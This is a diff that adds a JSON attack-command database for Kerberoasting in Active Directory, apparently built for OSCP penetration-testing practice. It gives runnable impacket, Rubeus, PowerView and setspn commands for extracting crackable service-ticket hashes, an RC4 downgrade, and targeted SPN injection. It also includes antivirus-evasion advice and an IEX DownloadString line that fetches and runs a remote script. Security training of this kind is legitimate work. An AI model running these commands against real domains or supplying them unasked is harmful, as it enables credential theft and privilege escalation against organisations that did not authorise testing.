@@ -1,0 +1,458 @@
+{
+  "commands": [
+    {
+      "id": "impacket-getuserspns-kerberoast",
+      "name": "impacket-GetUserSPNs - Kerberoasting Attack",
+      "description": "Request and extract TGS-REP hashes for service accounts (Kerberoasting)",
+      "command": "sudo impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>",
+      "category": "password-attacks",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<DC_IP>",
+          "description": "Domain controller IP address",
+          "example": "192.168.50.70",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Active Directory domain name",
+          "example": "corp.com",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "Valid domain username for authentication",
+          "example": "pete",
+          "required": true
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROASTING",
+        "KERBEROS",
+        "SPN",
+        "LINUX",
+        "IMPACKET",
+        "OSCP:HIGH"
+      ],
+      "flag_explanations": {
+        "-request": "Request TGS tickets - Automatically request service tickets for all discovered SPNs and extract hashes",
+        "-dc-ip": "Domain controller IP",
+        "-outputfile": "Save hashes to file - Syntax: -outputfile hashes.kerberoast (Hashcat mode 13100 format)",
+        "-save": "Save TGS tickets to .ccache files for later use",
+        "Password": "Domain user password (prompted if not provided in command)"
+      },
+      "success_indicators": [
+        "ServicePrincipalName",
+        "Name",
+        "MemberOf",
+        "$krb5tgs$23$"
+      ],
+      "failure_indicators": [
+        "KRB_AP_ERR_SKEW",
+        "Kerberos SessionError",
+        "No entries found"
+      ],
+      "next_steps": [
+        "hashcat-crack-tgsrep"
+      ],
+      "alternatives": [
+        "rubeus-kerberoast",
+        "powerview-kerberoast"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "KRB_AP_ERR_SKEW(Clock skew too great)": "Time sync issue. Solution: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>. Kerberos requires <5 minute time difference.",
+        "No entries found": "No SPNs linked to user accounts (only computer accounts found). Computer/MSA accounts have 120-character random passwords (uncrackable). This is common - not all domains have service accounts with SPNs.",
+        "[-] CCache file is not found": "Normal warning - can be ignored. Use -save flag only if you need .ccache files for ticket injection."
+      },
+      "notes": "KERBEROASTING extracts TGS-REP hashes from service accounts. WHY THIS WORKS: Any authenticated domain user can request TGS (service ticket) for ANY SPN in the domain. The TGS is encrypted with the service account's password hash. No permission checks at TGS request time - checks only happen when accessing the actual service. This allows offline hash cracking. TARGET ACCOUNTS: Service accounts with SPNs (SQL Server, IIS, custom services). CRITICAL DISTINCTION: Computer accounts (MACHINE$) and Managed Service Accounts (MSAs) use 120-character random passwords - effectively uncrackable. Focus on USER accounts with SPNs (iis_service, sql_service, etc.). HASH FORMAT: Output is $krb5tgs$23$ (Kerberos 5 TGS-REP etype 23 = RC4-HMAC). Use Hashcat mode 13100. RC4 VS AES: Accounts with 'msDS-SupportedEncryptionTypes' attribute set to AES will return AES-encrypted tickets (harder to crack). Use Rubeus with /tgtdeleg flag to force RC4 (see rubeus-kerberoast-aes). OSCP TIP: Kerberoasting is HIGH-PRIORITY attack - fast to execute (30 seconds), often successful (weak service account passwords common), and requires only domain user credentials. TIME ESTIMATE: 10-30 seconds for hash extraction + 1-120 minutes for cracking (depends on password). DETECTION: Event ID 4769 (TGS request) - normal Kerberos traffic, difficult to distinguish from legitimate service access. STEALTH: Very low detection risk. OUTPUT ANALYSIS: Look for accounts in privileged groups (memberof column). Service accounts are often over-privileged (Domain Admins, local admins on multiple systems). Clock sync is CRITICAL - use ntpdate or rdate if KRB_AP_ERR_SKEW errors occur.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "impacket-getuserspns-list",
+      "name": "impacket-GetUserSPNs - List SPNs Only",
+      "description": "Enumerate service principal names without requesting TGS tickets",
+      "command": "sudo impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME>",
+      "category": "enumeration",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<DC_IP>",
+          "description": "Domain controller IP address",
+          "example": "192.168.50.70",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Active Directory domain name",
+          "example": "corp.com",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "Valid domain username",
+          "example": "pete",
+          "required": true
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "SPN",
+        "KERBEROASTING",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
+      "flag_explanations": {
+        "-dc-ip": "Domain controller IP",
+        "Password": "Domain user password (prompted)"
+      },
+      "success_indicators": [
+        "ServicePrincipalName",
+        "Name",
+        "MemberOf",
+        "PasswordLastSet"
+      ],
+      "failure_indicators": [
+        "No entries found",
+        "Kerberos SessionError"
+      ],
+      "next_steps": [
+        "impacket-getuserspns-kerberoast",
+        "rubeus-kerberoast"
+      ],
+      "alternatives": [
+        "setspn-list-user-spns"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "No entries found": "No SPNs registered to user accounts. Common - many domains only use computer accounts for services (120-char passwords, uncrackable).",
+        "Clock skew error": "Time sync required: sudo ntpdate <DC_IP>"
+      },
+      "notes": "SPN ENUMERATION ONLY - lists service accounts without extracting hashes. Use this for: (1) Reconnaissance before Kerberoasting. (2) Identifying high-value targets. (3) Checking if Kerberoasting is viable. OUTPUT COLUMNS: ServicePrincipalName (service type and hostname), Name (account name), MemberOf (group membership - look for admin groups), PasswordLastSet (old = weak password likely), LastLogon (active account check). SPN FORMAT: protocol/hostname:port (e.g., HTTP/web04.corp.com:80, MSSQLSvc/sql01.corp.com:1433). TARGET SELECTION: Prioritize accounts with: (1) Old PasswordLastSet dates (>1 year = weak password likely). (2) Privileged group membership (Domain Admins, Enterprise Admins). (3) Generic service names (sql_service, iis_service often have weak passwords like 'Password1!'). COMPUTER ACCOUNTS: Ignore SPNs registered to computer accounts (ending in $) - these have 120-character random passwords. OSCP STRATEGY: Run enumeration FIRST to identify targets, then use -request flag for hash extraction. TIME ESTIMATE: <5 seconds. NO HASH EXTRACTION: Add -request flag to extract TGS-REP hashes (see impacket-getuserspns-kerberoast). DETECTION: Minimal - standard LDAP queries for SPN attribute, Event ID 4662 (directory service access).",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "rubeus-kerberoast",
+      "name": "Rubeus - Kerberoasting (Windows)",
+      "description": "Extract TGS-REP hashes from Windows using Rubeus",
+      "command": ".\\Rubeus.exe kerberoast /outfile:<OUTPUT_FILE>",
+      "category": "password-attacks",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<OUTPUT_FILE>",
+          "description": "Output file for TGS-REP hashes",
+          "example": "C:\\Tools\\hashes.kerberoast",
+          "required": true
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROASTING",
+        "KERBEROS",
+        "SPN",
+        "WINDOWS",
+        "RUBEUS",
+        "OSCP:HIGH"
+      ],
+      "flag_explanations": {
+        "kerberoast": "Kerberoasting mode - Request TGS tickets for all discovered SPNs and extract hashes",
+        "/outfile": "Save hashes to file in Hashcat mode 13100 format",
+        "/user": "Target specific user - Syntax: /user:iis_service",
+        "/tgtdeleg": "Force RC4 encryption for AES-enabled accounts (see rubeus-kerberoast-aes)",
+        "/nowrap": "Disable line wrapping (useful for copy-paste)",
+        "/spn": "Target specific SPN - Syntax: /spn:HTTP/web04.corp.com",
+        "/domain": "Specify domain - Auto-detected if omitted",
+        "/dc": "Specify domain controller - Syntax: /dc:DC1.corp.com"
+      },
+      "success_indicators": [
+        "SamAccountName",
+        "DistinguishedName",
+        "ServicePrincipalName",
+        "Supported ETypes",
+        "$krb5tgs$23$",
+        "Hash written to"
+      ],
+      "failure_indicators": [
+        "No users found",
+        "Access denied",
+        "Unhandled Rubeus exception"
+      ],
+      "next_steps": [
+        "hashcat-crack-tgsrep"
+      ],
+      "alternatives": [
+        "impacket-getuserspns-kerberoast",
+        "powerview-kerberoast"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "No users found": "No SPNs registered to user accounts. Common - focus on other attack vectors or enumerate with setspn -Q */* to verify.",
+        "Access denied": "Need domain user context. Run from domain-joined system as authenticated user OR use runas /netonly /user:<DOMAIN>\\<USER> cmd.exe",
+        "Unhandled Rubeus exception": "AV detection or version incompatibility. Try: (1) Latest Rubeus release. (2) Obfuscated binary. (3) impacket-GetUserSPNs from Linux.",
+        "NOTICE: AES hashes will be returned": "See rubeus-kerberoast-aes for RC4 downgrade technique (/tgtdeleg flag)."
+      },
+      "notes": "WINDOWS-BASED KERBEROASTING using Rubeus.exe. ADVANTAGES OVER IMPACKET: (1) No credentials needed (uses current user context). (2) Faster from Windows (native Kerberos API). (3) No time sync issues. (4) Auto-discovers SPNs. EXECUTION CONTEXT: Run from domain-joined Windows system OR use runas /netonly. TOOL LOCATION: C:\\Tools\\Rubeus.exe on OSCP lab systems. Download: https://github.com/GhostPack/Rubeus. HASH OUTPUT: Hashcat mode 13100 compatible by default. AES VS RC4: Modern domains return AES-encrypted tickets (Supported ETypes: RC4_HMAC_DEFAULT vs AES256_CTS_HMAC_SHA1_96). AES is stronger and slower to crack. Use /tgtdeleg flag to force RC4 downgrade (see rubeus-kerberoast-aes). OSCP TIP: Rubeus preferred when you have RDP/WinRM access to Windows. No credentials needed, no time sync. OUTPUT ANALYSIS: Look for 'Supported ETypes: RC4_HMAC_DEFAULT' (easier to crack) vs AES (harder). Target RC4 accounts first. TIME ESTIMATE: 10-30 seconds for hash extraction. AV EVASION: Rubeus flagged by Windows Defender. Options: (1) Disable AV. (2) Obfuscated version. (3) Reflective loading. (4) Fall back to impacket from Linux. MULTIPLE ACCOUNTS: Rubeus automatically finds ALL SPNs linked to user accounts and extracts hashes sequentially. Hash saved to /outfile path specified. DETECTION: Event ID 4769 (TGS request) - normal Kerberos traffic, low visibility.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "rubeus-kerberoast-aes",
+      "name": "Rubeus - Kerberoasting with RC4 Downgrade",
+      "description": "Force RC4 encryption for AES-enabled accounts using TGT delegation",
+      "command": ".\\Rubeus.exe kerberoast /tgtdeleg /outfile:<OUTPUT_FILE>",
+      "category": "password-attacks",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<OUTPUT_FILE>",
+          "description": "Output file for RC4-encrypted TGS hashes",
+          "example": "C:\\Tools\\hashes_rc4.kerberoast",
+          "required": true
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROASTING",
+        "KERBEROS",
+        "RC4_DOWNGRADE",
+        "WINDOWS",
+        "RUBEUS",
+        "OSCP:MEDIUM"
+      ],
+      "flag_explanations": {
+        "/tgtdeleg": "TGT delegation - Force RC4 encryption by requesting constrained delegation ticket first. Exploits unconstrained delegation to downgrade from AES to RC4 (weaker encryption, faster cracking).",
+        "kerberoast": "Kerberoasting mode",
+        "/outfile": "Save RC4-encrypted hashes to file"
+      },
+      "success_indicators": [
+        "Supported ETypes       : RC4_HMAC_DEFAULT",
+        "$krb5tgs$23$",
+        "Hash written to"
+      ],
+      "failure_indicators": [
+        "Unhandled Rubeus exception",
+        "Access denied"
+      ],
+      "next_steps": [
+        "hashcat-crack-tgsrep"
+      ],
+      "alternatives": [
+        "rubeus-kerberoast"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Still getting AES hashes": "TGT delegation failed. Domain may enforce AES-only (rare). Crack AES hash with Hashcat mode 19600/19700 (slower) OR focus on other accounts.",
+        "Unhandled exception": "TGT delegation not permitted for current user. Fall back to standard Rubeus kerberoast (accept AES encryption)."
+      },
+      "notes": "RC4 DOWNGRADE TECHNIQUE for accounts configured to use AES encryption. WHY THIS MATTERS: AES-encrypted TGS tickets are SLOWER to crack than RC4 (10-100x slower depending on hardware). Modern domains default to AES for stronger security. RC4 is legacy but still supported for backward compatibility. /tgtdeleg MECHANISM: Requests TGT with constrained delegation flag, then uses that TGT to request TGS. The delegation TGT forces RC4 encryption regardless of account's encryption type setting. WHEN TO USE: (1) Rubeus kerberoast shows 'Supported ETypes: AES256_CTS_HMAC_SHA1_96'. (2) You have limited time for cracking (OSCP exam). (3) Weak password suspected (worth trying faster cracking method). OSCP TIP: Try /tgtdeleg FIRST to get RC4 hashes. If it fails, fall back to standard kerberoasting with AES hashes. TIME SAVINGS: RC4 cracking is ~10x faster than AES. Example: rockyou.txt with rules takes 3 hours for RC4 vs 30+ hours for AES. DETECTION: Same as standard Kerberoasting - Event ID 4769 (TGS request). TGT delegation adds Event ID 4768 (TGT request) but still normal Kerberos traffic. HASH FORMAT: Output is still Hashcat mode 13100 ($krb5tgs$23$ = etype 23 = RC4-HMAC). AES would be mode 19600/19700. LIMITATIONS: Some hardened domains disable RC4 entirely (enforce AES-only). In this case, /tgtdeleg will fail and you must crack AES hashes. NOT ALWAYS NEEDED: Check 'Supported ETypes' in standard Rubeus output. If already RC4_HMAC_DEFAULT, no need for /tgtdeleg.",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "powerview-kerberoast",
+      "name": "PowerView - Invoke-Kerberoast",
+      "description": "Kerberoasting using PowerView PowerShell module",
+      "command": "Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash",
+      "category": "password-attacks",
+      "subcategory": "active-directory",
+      "variables": [],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROASTING",
+        "KERBEROS",
+        "POWERSHELL",
+        "POWERVIEW",
+        "WINDOWS",
+        "OSCP:MEDIUM"
+      ],
+      "flag_explanations": {
+        "-OutputFormat": "Hash format - Options: Hashcat (mode 13100), John. Use Hashcat for consistency.",
+        "-Identity": "Target specific user - Syntax: -Identity iis_service",
+        "-Domain": "Specify domain - Auto-detected if omitted",
+        "-Server": "Specify domain controller - Syntax: -Server DC1.corp.com",
+        "Select-Object -ExpandProperty Hash": "Extract only hash string (removes metadata for cleaner output)"
+      },
+      "success_indicators": [
+        "$krb5tgs$23$",
+        "Hash",
+        "SamAccountName"
+      ],
+      "failure_indicators": [
+        "Invoke-Kerberoast : The term 'Invoke-Kerberoast' is not recognized",
+        "No SPN found"
+      ],
+      "next_steps": [
+        "hashcat-crack-tgsrep"
+      ],
+      "alternatives": [
+        "rubeus-kerberoast",
+        "impacket-getuserspns-kerberoast"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Invoke-Kerberoast not recognized": "PowerView not loaded. Import: Import-Module C:\\Tools\\PowerView.ps1 OR download: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')",
+        "No SPN found": "No user accounts with SPNs. Common - many domains use computer accounts only.",
+        "Access denied": "Need domain user context. Run from domain-joined system or use runas /netonly"
+      },
+      "notes": "POWERVIEW-BASED KERBEROASTING. ADVANTAGES: (1) Pure PowerShell (no exe upload). (2) Integrated with PowerView enumeration. (3) Flexible output formats. DISADVANTAGES: (1) Slower than Rubeus. (2) PowerView often flagged by AV. (3) Requires PowerView import. POWERVIEW LOCATION: C:\\Tools\\PowerView.ps1 on lab systems OR download from PowerSploit. IMPORT: Import-Module .\\PowerView.ps1 OR dot-source: . .\\PowerView.ps1. EXECUTION POLICY: May need bypass: powershell -ep bypass -c 'Import-Module .\\PowerView.ps1; Invoke-Kerberoast -OutputFormat Hashcat'. OUTPUT: Default shows SamAccountName, ServicePrincipalName, Hash. Use Select-Object -ExpandProperty Hash for hash-only output. OSCP TIP: Rubeus is generally preferred (faster, cleaner output). Use PowerView when: (1) Rubeus blocked by AV. (2) Already using PowerView for other enumeration. (3) Need PowerShell-only solution. SAVE TO FILE: Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File hashes.txt. TIME ESTIMATE: 30-60 seconds for hash extraction (slower than Rubeus). DETECTION: Event ID 4769 (TGS request) - normal Kerberos traffic. PowerView import may trigger Event ID 4104 (PowerShell script block logging) if enabled. ALTERNATIVE SYNTAX: Get-DomainSPNTicket (older PowerView cmdlet, same functionality).",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "setspn-list-user-spns",
+      "name": "setspn - List Service Principal Names",
+      "description": "Enumerate SPNs using Windows built-in setspn.exe",
+      "command": "setspn -Q */*",
+      "category": "enumeration",
+      "subcategory": "active-directory",
+      "variables": [],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "SPN",
+        "WINDOWS",
+        "BUILT-IN",
+        "OSCP:MEDIUM"
+      ],
+      "flag_explanations": {
+        "-Q": "Query - Search for SPNs matching pattern",
+        "*/*": "Wildcard pattern - Match all SPNs (protocol/hostname format)",
+        "-T": "Target domain - Syntax: -T corp.com (query specific domain)",
+        "-F": "Forest - Query entire forest instead of single domain"
+      },
+      "success_indicators": [
+        "CN=",
+        "Existing SPN found",
+        "HTTP/",
+        "MSSQLSvc/"
+      ],
+      "failure_indicators": [
+        "No such SPN found",
+        "Access denied"
+      ],
+      "next_steps": [
+        "rubeus-kerberoast",
+        "impacket-getuserspns-kerberoast"
+      ],
+      "alternatives": [
+        "impacket-getuserspns-list"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "No such SPN found": "No SPNs registered OR not enough permissions. Verify: setspn -Q */ (simplified query) or use domain admin account.",
+        "Access denied": "Need domain user privileges. Run from domain-joined system as authenticated user."
+      },
+      "notes": "BUILT-IN SPN ENUMERATION using setspn.exe (no tools needed). ADVANTAGES: (1) Built into Windows (no upload). (2) Legitimate admin tool (low suspicion). (3) No AV flags. (4) Works on very old Windows versions. DISADVANTAGES: (1) Shows ALL SPNs (computer + user accounts - requires manual filtering). (2) No automatic hash extraction. (3) Verbose output. OUTPUT FORMAT: Shows CN= (common name), servicePrincipalName, and DN (distinguished name). FILTERING USER ACCOUNTS: Look for CN= lines without $ (computer accounts end in $). Example: CN=iis_service vs CN=WEB01$ (computer). COMMON SPN TYPES: HTTP/ (web servers, IIS), MSSQLSvc/ (SQL Server), WSMAN/ (WinRM), HOST/ (multiple services), TERMSRV/ (RDP), RestrictedKrbHost/ (Kerberos-constrained delegation). OSCP TIP: Use setspn for initial reconnaissance when Rubeus/impacket unavailable. Note user account SPNs, then use Rubeus/impacket for hash extraction. MANUAL FILTERING: setspn -Q */* | findstr /V '$' | findstr 'CN=' (remove computer accounts, show only CN lines). TIME ESTIMATE: 5-15 seconds depending on domain size. DETECTION: Legitimate admin activity - Event ID 4662 (directory service access). Very low suspicion. ALTERNATIVE: setspn -T corp.com -Q */* (specify domain explicitly).",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "targeted-kerberoast-set",
+      "name": "Targeted Kerberoasting - Set SPN on User Account",
+      "description": "Add service principal name to user account for targeted Kerberoasting (requires GenericWrite/GenericAll)",
+      "command": "Set-DomainObject -Identity <USERNAME> -Set @{serviceprincipalname='HTTP/<HOSTNAME>'} -Verbose",
+      "category": "privilege-escalation",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<USERNAME>",
+          "description": "Target username to add SPN",
+          "example": "targetuser",
+          "required": true
+        },
+        {
+          "name": "<HOSTNAME>",
+          "description": "Fake hostname for SPN (can be arbitrary)",
+          "example": "fake.corp.com",
+          "required": true
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "PRIVILEGE_ESCALATION",
+        "KERBEROASTING",
+        "TARGETED_ATTACK",
+        "POWERVIEW",
+        "WINDOWS",
+        "OSCP:MEDIUM"
+      ],
+      "flag_explanations": {
+        "-Identity": "Target user account",
+        "-Set": "Set attribute - Syntax: @{attributename='value'}. serviceprincipalname attribute takes SPN string.",
+        "-Verbose": "Show detailed output",
+        "serviceprincipalname": "SPN attribute - Format: protocol/hostname (e.g., HTTP/fake.corp.com, MSSQLSvc/fake.corp.com:1433)"
+      },
+      "success_indicators": [
+        "serviceprincipalname set",
+        "Success"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "Insufficient access rights"
+      ],
+      "next_steps": [
+        "rubeus-kerberoast",
+        "impacket-getuserspns-kerberoast",
+        "targeted-kerberoast-cleanup"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Access denied": "Missing GenericWrite/GenericAll permissions. Verify: Get-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}",
+        "Set-DomainObject not recognized": "PowerView not loaded. Import: Import-Module .\\PowerView.ps1",
+        "SPN already exists": "Account already has SPN OR duplicate SPN in domain. Use different protocol/hostname combination."
+      },
+      "notes": "TARGETED KERBEROASTING attack for scenarios where no existing SPNs on user accounts. REQUIREMENTS: GenericWrite OR GenericAll permissions on target user. ATTACK FLOW: (1) Identify user you have write permissions on. (2) Add fake SPN. (3) Extract TGS hash with Rubeus/impacket. (4) Crack hash offline. (5) CLEANUP: Remove SPN (CRITICAL - see targeted-kerberoast-cleanup). SPN FORMAT: protocol/hostname format (e.g., HTTP/fake.corp.com). Hostname doesn't need to exist - AD doesn't validate. Protocol can be any string. ETHICAL NOTE: Modifies production AD. ALWAYS remove SPN after obtaining hash. Document in assessment notes. OSCP SCENARIO: Common with delegated permissions, service account management, misconfigured ACLs. PERMISSION CHECK: Get-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (whoami /user)[1]} | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}. TIME ESTIMATE: 5 seconds to add SPN + 10 seconds to extract hash + 1-120 minutes to crack. DETECTION: Event ID 4742 (computer account changed) or 4738 (user account changed) - shows servicePrincipalName modification. SUSPICIOUS if arbitrary SPN added to standard user account. CLEANUP CRITICAL: Failing to remove SPN leaves permanent modification in AD. Set reminder or use auto-cleanup script. ALTERNATIVE: Set-ADUser -Identity <USERNAME> -ServicePrincipalNames @{Add='HTTP/fake.corp.com'} (native AD PowerShell module, same result). MULTIPLE SPNs: User can have multiple SPNs. Use -Append instead of -Set to add without removing existing SPNs (rare scenario).",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "targeted-kerberoast-cleanup",
+      "name": "Targeted Kerberoasting - Remove SPN (Cleanup)",
+      "description": "Remove service principal name added during targeted Kerberoasting attack",
+      "command": "Set-DomainObject -Identity <USERNAME> -Clear serviceprincipalname -Verbose",
+      "category": "cleanup",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<USERNAME>",
+          "description": "User account to cleanup (same as targeted-kerberoast-set)",
+          "example": "targetuser",
+          "required": true
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "CLEANUP",
+        "KERBEROASTING",
+        "TARGETED_ATTACK",
+        "POWERVIEW",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
+      "flag_explanations": {
+        "-Identity": "Target user account",
+        "-Clear": "Clear attribute - Removes all values from specified attribute",
+        "-Verbose": "Confirm SPN removed",
+        "serviceprincipalname": "Attribute to clear"
+      },
+      "success_indicators": [
+        "serviceprincipalname cleared",
+        "Success"
+      ],
+      "failure_indicators": [
+        "Access denied"
+      ],
+      "next_steps": [],
+      "alternatives": [],
+      "prerequisites": [
+        "targeted-kerberoast-set"
+      ],
+      "troubleshooting": {
+        "Access denied": "Lost permissions or account locked. Escalate to domain admin or notify client.",
+        "How to verify SPN removed": "Get-DomainUser -Identity <USERNAME> -Properties serviceprincipalname | Select-Object serviceprincipalname. Should be empty/null."
+      },
+      "notes": "CRITICAL CLEANUP STEP after targeted Kerberoasting. -Clear OPERATION: Removes ALL SPNs from account. If account had legitimate SPNs before your attack, use -Set @{serviceprincipalname='original_spn'} instead of -Clear to restore original. VERIFICATION: Get-DomainUser -Identity <USERNAME> -Properties serviceprincipalname. Should show no serviceprincipalname attribute OR empty value. OSCP REQUIREMENT: Always document cleanup in assessment report. Show before/after SPN values as evidence. AUTOMATION: Create cleanup script: Start-Sleep -Seconds 1800; Set-DomainObject -Identity <USERNAME> -Clear serviceprincipalname (auto-cleanup after 30 min). TIME TO CLEANUP: <5 seconds. WHY CLEANUP MATTERS: (1) Ethical requirement - restore environment to original state. (2) Detection - arbitrary SPNs on user accounts are suspicious. (3) Functionality - fake SPNs may interfere with legitimate services. FAILED CLEANUP: If you lose access before cleanup, document in report and notify client immediately. Provide manual steps: Open ADUC → Find user → Properties → Attribute Editor → servicePrincipalName → Remove values. VERIFICATION COMMAND: (Get-DomainUser -Identity <USERNAME> -Properties serviceprincipalname).serviceprincipalname (should return $null or empty). ALTERNATIVE: Set-ADUser -Identity <USERNAME> -ServicePrincipalNames @{Remove='HTTP/fake.corp.com'} (removes specific SPN, preserves others if they exist). RESTORE ORIGINAL: If account had legitimate SPN before attack, use Get-DomainUser output from BEFORE attack to restore exact original value.",
+      "oscp_relevance": "high"
+    }
+  ]
+}
